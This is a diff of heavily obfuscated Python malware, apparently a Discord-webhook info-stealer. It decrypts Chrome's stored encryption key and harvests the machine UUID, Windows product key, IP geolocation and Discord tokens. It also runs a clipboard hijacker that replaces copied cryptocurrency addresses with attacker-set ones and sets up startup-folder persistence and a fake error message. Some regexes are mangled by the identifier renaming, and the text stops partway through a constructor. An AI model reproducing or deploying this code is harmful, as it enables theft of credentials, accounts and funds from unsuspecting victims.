+IlIlIlllIIlIll = IlIIllIll"[\w-]{24}\." + IIllIIIllll.text
+class IIlIlIllIlI(object):
     @staticmethod
-    def lIlIIIllIIIIIlII(lIllIIllI: str or os.PathLike):
-        if not ntpath.exists(lIllIIllI):
+    def lllIlIIlIIIll(lllIllIIlIlllllIIIIl: str or os.PathLike):
+        if not ntpath.exists(lllIllIIlIlllllIIIIl):
             return None
-        with open(lIllIIllI, "r", encoding="utf-8") as lIIIIllIlIIIllIIl:
-            IlIlIIlllllIlIlI = lIIIIllIlIIIllIIl.read()
-        IllIllIlllIllll = json.loads(IlIlIIlllllIlIlI)
+        with open(lllIllIIlIlllllIIIIl, "r", encoding="utf-8") as llllIlIlll:
+            lIlllIIlIIIIIlIII = llllIlIlll.read()
+        IlllIIIIlIIIlIl = json.loads(lIlllIIlIIIIIlIII)
         try:
-            lllIIIlIlIlIIllI = b64decode(IllIllIlllIllll["os_crypt"]["encrypted_key"])
-            return lIlIIIllIII.llIllIIlIIIlIllIlll(lllIIIlIlIlIIllI[5:])
+            IIlIllIllIIlIII = b64decode(IlllIIIIlIIIlIl["os_crypt"]["encrypted_key"])
+            return IIlIlIllIlI.llIlIlIlllIlIll(IIlIllIllIIlIII[5:])
         except KeyError:
             return None
     @staticmethod
-    def IllIlIIlIll(IlllIlIIlIIlIlllll: int or float) -> str:
+    def IlIIlIllIlllll(lIlllIlIIII: int or float) -> str:
         try:
-            llIIlIIlIlIllIIIII = datetime(1601, 1, 1, tzinfo=timezone.utc)
-            lIIlIlIl = llIIlIIlIlIllIIIII + timedelta(microseconds=IlllIlIIlIIlIlllll)
-            return lIIlIlIl
+            IlIIIIlIIIlIl = datetime(1601, 1, 1, tzinfo=timezone.utc)
+            lIlIIlIlllll = IlIIIIlIIIlIl + timedelta(microseconds=lIlllIlIIII)
+            return lIlIIlIlllll
         except Exception:
             pass
     @staticmethod
-    def llIllIIlIIIlIllIlll(IllllIIIIlIIII: bytes) -> str:
-        return llIIllIlIllIIlIIll(IllllIIIIlIIII, None, None, None, 0)[1]
+    def llIlIlIlllIlIll(lIllllllIIlll: bytes) -> str:
+        return lIIIlllllI(lIllllllIIlll, None, None, None, 0)[1]
     @staticmethod
-    def IIllIllIllIIllllIII(lIlIIIlIlllll: str or os.PathLike = gettempdir()):
-        lIlIlllIIIIIIll = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for lIlIIlIllllllIlIIIIl in range(random.randint(10, 20)))
-        lIllIIllI = ntpath.join(lIlIIIlIlllll, lIlIlllIIIIIIll)
-        open(lIllIIllI, "x")
-        return lIllIIllI
+    def IlIlIllIIIlllIllllI(IlIlIIIllIIllIl: str or os.PathLike = gettempdir()):
+        IlIlIIIllI = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for IIllIIllllIlIIlIl in range(random.randint(10, 20)))
+        lllIllIIlIlllllIIIIl = ntpath.join(IlIlIIIllIIllIl, IlIlIIIllI)
+        open(lllIllIIlIlllllIIIIl, "x")
+        return lllIllIIlIlllllIIIIl
     @staticmethod
-    def IIIlllIIIIIlIllIIll(llllIllIllIllIIllI, lllIIIlIlIlIIllI) -> str:
+    def lIIIIIllIl(IllIlIIIIIIlll, IIlIllIllIIlIII) -> str:
         try:
-            IlIlIllIIIlIllI = llllIllIllIllIIllI[3:15]
-            llIllIIIlIIllIl = llllIllIllIllIIllI[15:]
-            llllIIIlIIIlIIIIII = AES.new(lllIIIlIlIlIIllI, AES.MODE_GCM, IlIlIllIIIlIllI)
-            lllIIlll = llllIIIlIIIlIIIIII.decrypt(llIllIIIlIIllIl)
-            lllIIlll = lllIIlll[:-16].decode()
-            return lllIIlll
+            IIllllIllIlIlIllI = IllIlIIIIIIlll[3:15]
+            llIlIlIlIIlIIIllII = IllIlIIIIIIlll[15:]
+            IllIlIIIIIlllllIIIlI = AES.new(IIlIllIllIIlIII, AES.MODE_GCM, IIllllIllIlIlIllI)
+            IIIlllIllIlIIllll = IllIlIIIIIlllllIIIlI.decrypt(llIlIlIlIIlIIIllII)
+            IIIlllIllIlIIllll = IIIlllIllIlIIllll[:-16].decode()
+            return IIIlllIllIlIIllll
         except Exception:
-            return lIIIIllIlIIIllIIl'Failed to decrypt "{str(llllIllIllIllIIllI)}" | key: "{str(lllIIIlIlIlIIllI)}"'
+            return llllIlIlll'Failed to decrypt "{str(IllIlIIIIIIlll)}" | key: "{str(IIlIllIllIIlIII)}"'
     @staticmethod
-    def IIllIIll(IIIIIIIIlIIIlIlII: str = None):
-        IIllIlIIlIIl = {
+    def IIlIIIlIlIIIIIll(lIIlIIIlIIl: str = None):
+        IlIIllIIIl = {
             "Content-Type": "application/json",
         }
-        if IIIIIIIIlIIIlIlII:
-            IIllIlIIlIIl.update({"Authorization": IIIIIIIIlIIIlIlII})
-        return IIllIlIIlIIl
+        if lIIlIIIlIIl:
+            IlIIllIIIl.update({"Authorization": lIIlIIIlIIl})
+        return IlIIllIIIl
     @staticmethod
-    def IlllIlll() -> list:
-        IIIllIIllIIll = 0x08000000
-        IlIIIIlIIIlIlIl = "wmic csproduct get uuid"
-        lIlIlIllllIIIIllIl = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"
-        IlIlIIIlIllIllI = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName"
+    def lIIlIllIII() -> list:
+        IIIlIlllIlIlllI = 0x08000000
+        IIIIlIIllI = "wmic csproduct get uuid"
+        lIllIIIlIllll = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"
+        IIllIIllIllIIlIlII = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName"
         try:
-            IIIllIIIlIIlIIlIll = subprocess.check_output(IlIIIIlIIIlIlIl, creationflags=IIIllIIllIIll).decode().split('\n')[1].strip()
+            llIIIIllIll = subprocess.check_output(IIIIlIIllI, creationflags=IIIlIlllIlIlllI).decode().split('\n')[1].strip()
         except Exception:
-            IIIllIIIlIIlIIlIll = "N/A"
+            llIIIIllIll = "N/A"
         try:
-            IlIlIlIlI = subprocess.check_output(lIlIlIllllIIIIllIl, creationflags=IIIllIIllIIll).decode().rstrip()
+            IIIIIIlIllI = subprocess.check_output(lIllIIIlIllll, creationflags=IIIlIlllIlIlllI).decode().rstrip()
         except Exception:
-            IlIlIlIlI = "N/A"
+            IIIIIIlIllI = "N/A"
         try:
-            IIIIIIlIIIIlIllIlII = subprocess.check_output(IlIlIIIlIllIllI, creationflags=IIIllIIllIIll).decode().rstrip()
+            lIlIlllIIlII = subprocess.check_output(IIllIIllIllIIlIlII, creationflags=IIIlIlllIlIlllI).decode().rstrip()
         except Exception:
-            IIIIIIlIIIIlIllIlII = "N/A"
-        return [IIIllIIIlIIlIIlIll, IIIIIIlIIIIlIllIlII, IlIlIlIlI]
+            lIlIlllIIlII = "N/A"
+        return [llIIIIllIll, lIlIlllIIlII, IIIIIIlIllI]
     @staticmethod
-    def llllIllIIllllIllIIl() -> list:
-        lIIlllllllII, IlIlllIIlllII, IlllIIIlll, IIlIIIIll, llIlIlIlIl, lIIIlllIIIII, llIIIllllIIll = "None", "None", "None", "None", "None", "None", "None"
-        IIIIIIlIIIIIIlIII = httpx.get("https://ipinfo.io/json")
-        if IIIIIIlIIIIIIlIII.status_code == 200:
-            IlIlIlIllllIlIIlII = IIIIIIlIIIIIIlIII.json()
-            lIIlllllllII = IlIlIlIllllIlIIlII.get('ip')
-            IlIlllIIlllII = IlIlIlIllllIlIIlII.get('city')
-            IlllIIIlll = IlIlIlIllllIlIIlII.get('country')
-            IIlIIIIll = IlIlIlIllllIlIIlII.get('region')
-            llIlIlIlIl = IlIlIlIllllIlIIlII.get('org')
-            lIIIlllIIIII = IlIlIlIllllIlIIlII.get('loc')
-            llIIIllllIIll = "https://www.google.com/maps/search/google+map++" + lIIIlllIIIII
-        return [lIIlllllllII, IlIlllIIlllII, IlllIIIlll, IIlIIIIll, llIlIlIlIl, lIIIlllIIIII, llIIIllllIIll]
+    def llllIIlI() -> list:
+        lIIlIlIllllIIIlIIIl, IIIllllIllII, IIlIIlIIl, llIlIllIlIIIIll, IIlIlIIIl, IlllIIIl, lIllIIll = "None", "None", "None", "None", "None", "None", "None"
+        lIIIlIIIIIllIllIIIII = httpx.get("https://ipinfo.io/json")
+        if lIIIlIIIIIllIllIIIII.status_code == 200:
+            lIlIIIllIIlI = lIIIlIIIIIllIllIIIII.json()
+            lIIlIlIllllIIIlIIIl = lIlIIIllIIlI.get('ip')
+            IIIllllIllII = lIlIIIllIIlI.get('city')
+            IIlIIlIIl = lIlIIIllIIlI.get('country')
+            llIlIllIlIIIIll = lIlIIIllIIlI.get('region')
+            IIlIlIIIl = lIlIIIllIIlI.get('org')
+            IlllIIIl = lIlIIIllIIlI.get('loc')
+            lIllIIll = "https://www.google.com/maps/search/google+map++" + IlllIIIl
+        return [lIIlIlIllllIIIlIIIl, IIIllllIllII, IIlIIlIIl, llIlIllIlIIIIll, IIlIlIIIl, IlllIIIl, lIllIIll]
     @staticmethod
-    def lllllIIIll(IIlIlIIIlIlIIlII: str) -> str or bool | None:
-        return IlIIlllIIllIIllI.get(IIlIlIIIlIlIIlII)
-class lIIllIIllIlIlI(lIlIIIllIII):
-    def __init__(IIIIIIIllIllIIII):
-        IIIIIIIllIllIIII.llllIlIl = IIIIIIIllIllIIII.lllllIIIll("addresse_crypto_replacer")
-        IIIIIIIllIllIIII.IIIlIIIIlIIllIlll = IIIIIIIllIllIIII.lllllIIIll("addresse_btc")
-        IIIIIIIllIllIIII.IlllIlIlIl = IIIIIIIllIllIIII.lllllIIIll("addresse_eth")
-        IIIIIIIllIllIIII.lllllIllIIIlll = IIIIIIIllIllIIII.lllllIIIll("addresse_xchain")
-        IIIIIIIllIllIIII.IlIlIlIllIIIIlIllll = IIIIIIIllIllIIII.lllllIIIll("addresse_pchain")
-        IIIIIIIllIllIIII.IllIllIIIIlIlIlIll = IIIIIIIllIllIIII.lllllIIIll("addresse_cchain")
-        IIIIIIIllIllIIII.lIllIlIlllllIIlIIllI = IIIIIIIllIllIIII.lllllIIIll("addresse_monero")
-        IIIIIIIllIllIIII.IIIlIIIlIIIIlIIl = IIIIIIIllIllIIII.lllllIIIll("addresse_ada")
-        IIIIIIIllIllIIII.llIllIIIIllllI = IIIIIIIllIllIIII.lllllIIIll("addresse_dash")
-    def lIllIlIlllIlIIII(IIIIIIIllIllIIII):
+    def lIllllIIIllIIllIIll(llllllII: str) -> str or bool | None:
+        return IllllllllIIlIIlll.get(llllllII)
+class IlIllIIllIllIII(IIlIlIllIlI):
+    def __init__(lIIlllllllIlI):
+        lIIlllllllIlI.IllIllIll = lIIlllllllIlI.lIllllIIIllIIllIIll("addresse_crypto_replacer")
+        lIIlllllllIlI.IIlIlIIIIlIIlIlll = lIIlllllllIlI.lIllllIIIllIIllIIll("addresse_btc")
+        lIIlllllllIlI.IIIlIIIlIIIlllllll = lIIlllllllIlI.lIllllIIIllIIllIIll("addresse_eth")
+        lIIlllllllIlI.IlIlIlIIlllI = lIIlllllllIlI.lIllllIIIllIIllIIll("addresse_xchain")
+        lIIlllllllIlI.IIllllIll = lIIlllllllIlI.lIllllIIIllIIllIIll("addresse_pchain")
+        lIIlllllllIlI.IIIIIlIlllllIlI = lIIlllllllIlI.lIllllIIIllIIllIIll("addresse_cchain")
+        lIIlllllllIlI.IIllIIIIIl = lIIlllllllIlI.lIllllIIIllIIllIIll("addresse_monero")
+        lIIlllllllIlI.IllIlIlIll = lIIlllllllIlI.lIllllIIIllIIllIIll("addresse_ada")
+        lIIlllllllIlI.llIIIIlllIl = lIIlllllllIlI.lIllllIIIllIIllIIll("addresse_dash")
+    def llIIlllll(lIIlllllllIlI):
         try:
-            IIIIlIlIlIllll = pyperclip.paste()
-            if re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', IIIIlIlIlIllll):
-                if IIIIlIlIlIllll not in [IIIIIIIllIllIIII.IIIlIIIIlIIllIlll, IIIIIIIllIllIIII.IlllIlIlIl, IIIIIIIllIllIIII.lllllIllIIIlll, IIIIIIIllIllIIII.IlIlIlIllIIIIlIllll, IIIIIIIllIllIIII.IllIllIIIIlIlIlIll, IIIIIIIllIllIIII.lIllIlIlllllIIlIIllI, IIIIIIIllIllIIII.IIIlIIIlIIIIlIIl, IIIIIIIllIllIIII.llIllIIIIllllI]:
-                    if IIIIIIIllIllIIII.IIIlIIIIlIIllIlll != "none":
-                        pyperclip.copy(IIIIIIIllIllIIII.IIIlIIIIlIIllIlll)
+            lIlIIIIIl = pyperclip.paste()
+            if re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', lIlIIIIIl):
+                if lIlIIIIIl not in [lIIlllllllIlI.IIlIlIIIIlIIlIlll, lIIlllllllIlI.IIIlIIIlIIIlllllll, lIIlllllllIlI.IlIlIlIIlllI, lIIlllllllIlI.IIllllIll, lIIlllllllIlI.IIIIIlIlllllIlI, lIIlllllllIlI.IIllIIIIIl, lIIlllllllIlI.IllIlIlIll, lIIlllllllIlI.llIIIIlllIl]:
+                    if lIIlllllllIlI.IIlIlIIIIlIIlIlll != "none":
+                        pyperclip.copy(lIIlllllllIlI.IIlIlIIIIlIIlIlll)
                         pyperclip.paste()
-            if re.search('^0x[a-fA-F0-9]{40}$', IIIIlIlIlIllll):
-                pyperclip.copy(IIIIIIIllIllIIII.IlllIlIlIl)
+            if re.search('^0x[a-fA-F0-9]{40}$', lIlIIIIIl):
+                pyperclip.copy(lIIlllllllIlI.IIIlIIIlIIIlllllll)
                 pyperclip.paste()
-            if re.search('^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzIIlllIIlIlIlIllIIllIIIllIIlIl9llIllIlIllIllllll8glIIIIllIlIIIllIIl2IIIIIIIllvlIIIlIIIlllIIllIIlw0s3lIlIlllllln54khIlIlIIlllllIlIlIIIlIlIIIlIlIIlII6mullIlIlIIIIIIllIlIIl7IlIIlllII]{38}$', IIIIlIlIlIllll):
-                if IIIIIIIllIllIIII.lllllIllIIIlll != "none":
-                    if IIIIlIlIlIllll not in [IIIIIIIllIllIIII.IIIlIIIIlIIllIlll, IIIIIIIllIllIIII.IlllIlIlIl, IIIIIIIllIllIIII.lllllIllIIIlll, IIIIIIIllIllIIII.IlIlIlIllIIIIlIllll, IIIIIIIllIllIIII.IllIllIIIIlIlIlIll, IIIIIIIllIllIIII.lIllIlIlllllIIlIIllI, IIIIIIIllIllIIII.IIIlIIIlIIIIlIIl, IIIIIIIllIllIIII.llIllIIIIllllI]:
-                        pyperclip.copy(IIIIIIIllIllIIII.lllllIllIIIlll)
+            if re.search('^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzIlIIllIlllIIlIIlIIIIIlllI9lIllllIlIl8gllllIlIlll2lIllIIllIlIIIIvdw0s3IIlllllln54khlIlllIIlIIIIIlIIIllllllII6mulIlIlIIIlIlllIlllII7IIIlIIllIlIlllIllI]{38}$', lIlIIIIIl):
+                if lIIlllllllIlI.IlIlIlIIlllI != "none":
+                    if lIlIIIIIl not in [lIIlllllllIlI.IIlIlIIIIlIIlIlll, lIIlllllllIlI.IIIlIIIlIIIlllllll, lIIlllllllIlI.IlIlIlIIlllI, lIIlllllllIlI.IIllllIll, lIIlllllllIlI.IIIIIlIlllllIlI, lIIlllllllIlI.IIllIIIIIl, lIIlllllllIlI.IllIlIlIll, lIIlllllllIlI.llIIIIlllIl]:
+                        pyperclip.copy(lIIlllllllIlI.IlIlIlIIlllI)
                         pyperclip.paste()
-            if re.search('^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzIIlllIIlIlIlIllIIllIIIllIIlIl9llIllIlIllIllllll8glIIIIllIlIIIllIIl2IIIIIIIllvlIIIlIIIlllIIllIIlw0s3lIlIlllllln54khIlIlIIlllllIlIlIIIlIlIIIlIlIIlII6mullIlIlIIIIIIllIlIIl7IlIIlllII]{38}$', IIIIlIlIlIllll):
-                if IIIIIIIllIllIIII.IlIlIlIllIIIIlIllll != "none":
-                    if IIIIlIlIlIllll not in [IIIIIIIllIllIIII.IIIlIIIIlIIllIlll, IIIIIIIllIllIIII.IlllIlIlIl, IIIIIIIllIllIIII.lllllIllIIIlll, IIIIIIIllIllIIII.IlIlIlIllIIIIlIllll, IIIIIIIllIllIIII.IllIllIIIIlIlIlIll, IIIIIIIllIllIIII.lIllIlIlllllIIlIIllI, IIIIIIIllIllIIII.IIIlIIIlIIIIlIIl, IIIIIIIllIllIIII.llIllIIIIllllI]:
-                        pyperclip.copy(IIIIIIIllIllIIII.IlIlIlIllIIIIlIllll)
+            if re.search('^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzIlIIllIlllIIlIIlIIIIIlllI9lIllllIlIl8gllllIlIlll2lIllIIllIlIIIIvdw0s3IIlllllln54khlIlllIIlIIIIIlIIIllllllII6mulIlIlIIIlIlllIlllII7IIIlIIllIlIlllIllI]{38}$', lIlIIIIIl):
+                if lIIlllllllIlI.IIllllIll != "none":
+                    if lIlIIIIIl not in [lIIlllllllIlI.IIlIlIIIIlIIlIlll, lIIlllllllIlI.IIIlIIIlIIIlllllll, lIIlllllllIlI.IlIlIlIIlllI, lIIlllllllIlI.IIllllIll, lIIlllllllIlI.IIIIIlIlllllIlI, lIIlllllllIlI.IIllIIIIIl, lIIlllllllIlI.IllIlIlIll, lIIlllllllIlI.llIIIIlllIl]:
+                        pyperclip.copy(lIIlllllllIlI.IIllllIll)
                         pyperclip.paste()
-            if re.search('^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzIIlllIIlIlIlIllIIllIIIllIIlIl9llIllIlIllIllllll8glIIIIllIlIIIllIIl2IIIIIIIllvlIIIlIIIlllIIllIIlw0s3lIlIlllllln54khIlIlIIlllllIlIlIIIlIlIIIlIlIIlII6mullIlIlIIIIIIllIlIIl7IlIIlllII]{38}$', IIIIlIlIlIllll):
-                if IIIIIIIllIllIIII.IllIllIIIIlIlIlIll != "none":
-                    if IIIIlIlIlIllll not in [IIIIIIIllIllIIII.IIIlIIIIlIIllIlll, IIIIIIIllIllIIII.IlllIlIlIl, IIIIIIIllIllIIII.lllllIllIIIlll, IIIIIIIllIllIIII.IlIlIlIllIIIIlIllll, IIIIIIIllIllIIII.IllIllIIIIlIlIlIll, IIIIIIIllIllIIII.lIllIlIlllllIIlIIllI, IIIIIIIllIllIIII.IIIlIIIlIIIIlIIl, IIIIIIIllIllIIII.llIllIIIIllllI]:
-                        pyperclip.copy(IIIIIIIllIllIIII.IllIllIIIIlIlIlIll)
+            if re.search('^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzIlIIllIlllIIlIIlIIIIIlllI9lIllllIlIl8gllllIlIlll2lIllIIllIlIIIIvdw0s3IIlllllln54khlIlllIIlIIIIIlIIIllllllII6mulIlIlIIIlIlllIlllII7IIIlIIllIlIlllIllI]{38}$', lIlIIIIIl):
+                if lIIlllllllIlI.IIIIIlIlllllIlI != "none":
+                    if lIlIIIIIl not in [lIIlllllllIlI.IIlIlIIIIlIIlIlll, lIIlllllllIlI.IIIlIIIlIIIlllllll, lIIlllllllIlI.IlIlIlIIlllI, lIIlllllllIlI.IIllllIll, lIIlllllllIlI.IIIIIlIlllllIlI, lIIlllllllIlI.IIllIIIIIl, lIIlllllllIlI.IllIlIlIll, lIIlllllllIlI.llIIIIlllIl]:
+                        pyperclip.copy(lIIlllllllIlI.IIIIIlIlllllIlI)
                         pyperclip.paste()
-            if re.search('addr1[a-z0-9]+', IIIIlIlIlIllll):
-                    if IIIIlIlIlIllll not in [IIIIIIIllIllIIII.IIIlIIIIlIIllIlll, IIIIIIIllIllIIII.IlllIlIlIl, IIIIIIIllIllIIII.lllllIllIIIlll, IIIIIIIllIllIIII.IlIlIlIllIIIIlIllll, IIIIIIIllIllIIII.IllIllIIIIlIlIlIll, IIIIIIIllIllIIII.lIllIlIlllllIIlIIllI, IIIIIIIllIllIIII.IIIlIIIlIIIIlIIl, IIIIIIIllIllIIII.llIllIIIIllllI]:
-                        pyperclip.copy(IIIIIIIllIllIIII.IIIlIIIlIIIIlIIl)
+            if re.search('addr1[a-z0-9]+', lIlIIIIIl):
+                    if lIlIIIIIl not in [lIIlllllllIlI.IIlIlIIIIlIIlIlll, lIIlllllllIlI.IIIlIIIlIIIlllllll, lIIlllllllIlI.IlIlIlIIlllI, lIIlllllllIlI.IIllllIll, lIIlllllllIlI.IIIIIlIlllllIlI, lIIlllllllIlI.IIllIIIIIl, lIIlllllllIlI.IllIlIlIll, lIIlllllllIlI.llIIIIlllIl]:
+                        pyperclip.copy(lIIlllllllIlI.IllIlIlIll)
                         pyperclip.paste()
-            if re.search('/X[1-9A-HJ-NP-Za-km-z]{33}$/g', IIIIlIlIlIllll):
-                if IIIIIIIllIllIIII.llIllIIIIllllI != "none":
-                    if IIIIlIlIlIllll not in [IIIIIIIllIllIIII.IIIlIIIIlIIllIlll, IIIIIIIllIllIIII.IlllIlIlIl, IIIIIIIllIllIIII.lllllIllIIIlll, IIIIIIIllIllIIII.IlIlIlIllIIIIlIllll, IIIIIIIllIllIIII.IllIllIIIIlIlIlIll, IIIIIIIllIllIIII.lIllIlIlllllIIlIIllI, IIIIIIIllIllIIII.IIIlIIIlIIIIlIIl, IIIIIIIllIllIIII.llIllIIIIllllI]:
-                        pyperclip.copy(IIIIIIIllIllIIII.llIllIIIIllllI)
+            if re.search('/X[1-9A-HJ-NP-Za-km-z]{33}$/g', lIlIIIIIl):
+                if lIIlllllllIlI.llIIIIlllIl != "none":
+                    if lIlIIIIIl not in [lIIlllllllIlI.IIlIlIIIIlIIlIlll, lIIlllllllIlI.IIIlIIIlIIIlllllll, lIIlllllllIlI.IlIlIlIIlllI, lIIlllllllIlI.IIllllIll, lIIlllllllIlI.IIIIIlIlllllIlI, lIIlllllllIlI.IIllIIIIIl, lIIlllllllIlI.IllIlIlIll, lIIlllllllIlI.llIIIIlllIl]:
+                        pyperclip.copy(lIIlllllllIlI.llIIIIlllIl)
                         pyperclip.paste()
-            if re.search('/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g', IIIIlIlIlIllll):
-                if IIIIIIIllIllIIII.lIllIlIlllllIIlIIllI != "none":
-                    if IIIIlIlIlIllll not in [IIIIIIIllIllIIII.IIIlIIIIlIIllIlll, IIIIIIIllIllIIII.IlllIlIlIl, IIIIIIIllIllIIII.lllllIllIIIlll, IIIIIIIllIllIIII.IlIlIlIllIIIIlIllll, IIIIIIIllIllIIII.IllIllIIIIlIlIlIll, IIIIIIIllIllIIII.lIllIlIlllllIIlIIllI, IIIIIIIllIllIIII.IIIlIIIlIIIIlIIl, IIIIIIIllIllIIII.llIllIIIIllllI]:
-                        pyperclip.copy(IIIIIIIllIllIIII.lIllIlIlllllIIlIIllI)
+            if re.search('/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g', lIlIIIIIl):
+                if lIIlllllllIlI.IIllIIIIIl != "none":
+                    if lIlIIIIIl not in [lIIlllllllIlI.IIlIlIIIIlIIlIlll, lIIlllllllIlI.IIIlIIIlIIIlllllll, lIIlllllllIlI.IlIlIlIIlllI, lIIlllllllIlI.IIllllIll, lIIlllllllIlI.IIIIIlIlllllIlI, lIIlllllllIlI.IIllIIIIIl, lIIlllllllIlI.IllIlIlIll, lIIlllllllIlI.llIIIIlllIl]:
+                        pyperclip.copy(lIIlllllllIlI.IIllIIIIIl)
                         pyperclip.paste()
         except:
-            IlIlIlIllllIlIIlII = None
-    def lllIIllIIIIIlIl(IIIIIIIllIllIIII):
+            lIlIIIllIIlI = None
+    def lIllIllI(lIIlllllllIlI):
         while True:
-            IIIIIIIllIllIIII.lIllIlIlllIlIIII()
-    def IIIIlIlIIIIl(IIIIIIIllIllIIII):
-        if IIIIIIIllIllIIII.llllIlIl == "yes":
-            IIIIIIIllIllIIII.lllIIllIIIIIlIl()
-class IllIIllIllIIIlIlIIl(lIlIIIllIII):
-    def __init__(IIIIIIIllIllIIII):
-        IIIIIIIllIllIIII.IIllIIlIlIIIlIlIlIll = "https://discord.com/api/v9/users/@me"
-        IIIIIIIllIllIIII.lIllIIlIIIlIl = IIIIIIIllIllIIII.lllllIIIll('yourwebhookurl')
-        IIIIIIIllIllIIII.lIllIlIIlIlllIIIIII = IIIIIIIllIllIIII.lllllIIIll("hide")
-        IIIIIIIllIllIIII.IllIIIIIlIIIIlIlll = IIIIIIIllIllIIII.lllllIIIll("pingtype")
-        IIIIIIIllIllIIII.IIIIIllllIlII = IIIIIIIllIllIIII.lllllIIIll("ping")
-        IIIIIIIllIllIIII.lIIlIllllllIII = "https://discord.com/api/v9/users/@me"
-        IIIIIIIllIllIIII.IlIlllIlll = IIIIIIIllIllIIII.lllllIIIll("startup")
-        IIIIIIIllIllIIII.IIlIIIllIIlIIIIllIII = IIIIIIIllIllIIII.lllllIIIll("fake_error")
-        IIIIIIIllIllIIII.IIllIlIlllIlI = os.getenv("localappdata")
-        IIIIIIIllIllIIII.IIIllIIllIlllIlllII = os.getenv("appdata")
-        IIIIIIIllIllIIII.llIlIlIllIlIII = ntpath.join(IIIIIIIllIllIIII.IIllIlIlllIlI, 'Google', 'Chrome', 'User Data')
-        IIIIIIIllIllIIII.llIIIIllIIl, IIIIIIIllIllIIII.IllIIlIllIllIIII = mkdtemp(), gettempdir()
-        llIlIIlIlIlII, lIIlllIlIIl = IIIIIIIllIllIIII.IlllIlll(), IIIIIIIllIllIIII.llllIllIIllllIllIIl()
-        IIIIIIIllIllIIII.IIIllIIIlIIlIIlIll, IIIIIIIllIllIIII.IIIIIIlIIIIlIllIlII, IIIIIIIllIllIIII.IlIlIlIlI = llIlIIlIlIlII[0], llIlIIlIlIlII[1], llIlIIlIlIlII[2]
-        IIIIIIIllIllIIII.lIIlllllllII, IIIIIIIllIllIIII.IlIlllIIlllII, IIIIIIIllIllIIII.IlllIIIlll, IIIIIIIllIllIIII.IIlIIIIll, IIIIIIIllIllIIII.llIlIlIlIl, IIIIIIIllIllIIII.lIIIlllIIIII, IIIIIIIllIllIIII.llIIIllllIIll = lIIlllIlIIl[0], lIIlllIlIIl[1], lIIlllIlIIl[2], lIIlllIlIIl[3], lIIlllIlIIl[4], lIIlllIlIIl[5], lIIlllIlIIl[6]
-        IIIIIIIllIllIIII.llllIIIIllIlIIlIIIII = ntpath.join(IIIIIIIllIllIIII.IIIllIIllIlllIlllII, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-        IIIIIIIllIllIIII.IlIlIlIIlllllIl = "api/webhooks"
-        IIIIIIIllIllIIII.IIIIlIIIlIIllllllII = re.compile(IIlllIIlIlIlI'(^profile\s\d*)|default|(guest profile$)', re.IGNORECASE | re.MULTILINE);
-        IIIIIIIllIllIIII.lIIlIllllllIII = "https://discord.com/api/v9/users/@me"
-        IIIIIIIllIllIIII.lIlIlIlllIIlIII = IlIllIIIII
-        IIIIIIIllIllIIII.IIllIIIlIlll = IIlllIIlIlIlI"dQw4w9WgXcQ:[^\"]*"
-        IIIIIIIllIllIIII.IlIlIlIlll = []
-        IIIIIIIllIllIIII.lIIIIIIIIIIIIIlIIlIl = []
-        IIIIIIIllIllIIII.lIIIllIllllII = os.lIIIllIllllII;
-        IIIIIIIllIllIIII.llIlllllIIIl = [];
-        IIIIIIIllIllIIII.IIllllIllIIIlI = IIIIIIIllIllIIII.lIlIIIllIIIIIlII(ntpath.join(IIIIIIIllIllIIII.llIlIlIllIlIII, "Local State"));
-        os.makedirs(IIIIIIIllIllIIII.llIIIIllIIl, exist_ok=True);
-    def lIIllIllI(IIIIIIIllIllIIII: str) -> str:
-        if IIIIIIIllIllIIII.IIlIIIllIIlIIIIllIII == "yes":
+            lIIlllllllIlI.llIIlllll()
+    def lllIIlIlI(lIIlllllllIlI):
+        if lIIlllllllIlI.IllIllIll == "yes":
+            lIIlllllllIlI.lIllIllI()
+class llllIllIlllIIIlIl(IIlIlIllIlI):
+    def __init__(lIIlllllllIlI):
+        lIIlllllllIlI.lIIlIlIIllllIIIlI = "https://discord.com/api/v9/users/@me"
+        lIIlllllllIlI.llllllIllllllIlIIll = lIIlllllllIlI.lIllllIIIllIIllIIll('yourwebhookurl')
+        lIIlllllllIlI.IlIlIlIllIlIllI = lIIlllllllIlI.lIllllIIIllIIllIIll("hide")
+        lIIlllllllIlI.lIlIIlIIIlIlllll = lIIlllllllIlI.lIllllIIIllIIllIIll("pingtype")
+        lIIlllllllIlI.IIIlIIllIIlIlI = lIIlllllllIlI.lIllllIIIllIIllIIll("ping")
+        lIIlllllllIlI.IIlIlIIllIllIII = "https://discord.com/api/v9/users/@me"
+        lIIlllllllIlI.lIlllIIlIIlIIlIIIIII = lIIlllllllIlI.lIllllIIIllIIllIIll("startup")
+        lIIlllllllIlI.lllIIIIIIIIIIl = lIIlllllllIlI.lIllllIIIllIIllIIll("fake_error")
+        lIIlllllllIlI.IlIlIIllIIll = os.getenv("localappdata")
+        lIIlllllllIlI.IllllllI = os.getenv("appdata")
